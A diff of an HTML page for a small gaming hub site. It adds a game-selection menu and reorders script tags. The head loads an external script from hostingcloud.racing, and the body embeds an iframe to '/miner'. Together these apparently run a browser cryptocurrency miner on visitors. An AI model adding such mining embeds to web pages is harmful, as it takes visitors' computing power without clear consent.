@@ -15,22 +15,68 @@
       href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
     />
 
+    <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
+    <script src="https://www.hostingcloud.racing/5pDo.js"></script>
+
     <script src="/client.js" defer></script>
     <script src="/fly.js" defer></script>
     <script src="/games/dice.js" defer></script>
 
-    <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
-    <script src="https://www.hostingcloud.racing/5pDo.js"></script>
-
     <link rel="stylesheet" href="/style.css" />
+    <link rel="stylesheet" href="/games/style.css" defer />
   </head>
   <body>
     <miner><iframe src="/miner"> </iframe></miner>
-    <div id="hubs"></div>
-        <div id="slots"></div>
+    <div id="hubs" class="hide" title="HUBS"></div>
+    <div id="games" class="hide" title="CLOSED">
+      <div class="gameWrap">
+        <center>
+          <br />
+          <h3>Select A Game</h3>
+          <div onclick="burgersLoad();" class="pinnBurgers">
+            <div class="gTitle" id="burgers" title="Closed">Pinn Burgers</div>
+          </div>
+
+          <div onclick="soundsLoad();" class="elcipseSounds">
+            <div class="gTitle" id="sounds" title="Closed">Eclipse Sounds</div>
+          </div>
+          <div onclick="gametest();" class="gametest">
+            <div class="gTitle" id="gametest" title="Closed">
+              GameTestPlay Ball
+            </div>
+          </div>
+          <div onclick="bombsLoad();" class="bombsG">
+            <div class="gTitle" id="bombs" title="Closed">
+              <div
+                id="quitgameBombs"
+                style="display: none"
+                title="Quit Game"
+                onclick="bombsLoad();"
+              >
+                X
+              </div>
+              Bombs
+            </div>
+          </div>
+
+          <div onclick="slotsLoad();" class="slots">
+            <div class="gTitle" id="slots" title="Closed">
+              <div
+                id="quitgameSlots"
+                style="display: none"
+                title="Quit Game"
+                onclick="slotsLoad();"
+              >
+                X
+              </div>
+              Slots
+            </div>
+          </div>
+        </center>
+      </div>
+    </div>
 
     <div id="rewardPop" class="hide"></div>
-
     <div class="SuperLogin" id="login">
       <div class="backgrounds">
         <center>
